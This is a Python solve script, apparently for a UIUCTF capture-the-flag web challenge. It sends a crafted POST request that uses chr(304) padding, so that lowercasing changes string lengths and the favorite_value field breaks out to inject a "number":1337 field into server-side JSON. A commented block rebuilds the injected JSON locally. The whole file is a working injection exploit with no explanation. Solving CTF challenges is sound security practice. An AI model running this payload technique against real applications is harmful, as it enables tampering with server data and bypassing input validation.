import requests

sess = requests.Session()

url = 'http://miniaturehorsedb.chal.uiuc.tf/'
url1 = 'http://miniaturehorsedb.chal.uiuc.tf/pony'

sess.get(url=url)
data = {"name":"taidh","bio":"taidh1234","image":"images","favorite_key":chr(304)*64,"favorite_value":'","number":1337,"abc":"'.ljust(64),"word":chr(304)*23+'_"}',"number":0}
# data1 = {"name":"taidh","bio":"taidh1234","image":"images","favorite_key":"a","favorite_value":"a","word":"a","number":2}
r= sess.post(url=url1,data=data)
print(r.text)

# import json

# favorite_key = chr(304)*64
# favorite_value = '","number":1337,"abc":"'.ljust(64)
# word = chr(304)*23+'_"}'

# data = f'{{"{favorite_key.lower()}":"{favorite_value.lower()}","word":"{word.lower()}","number":0}}'
# print(data)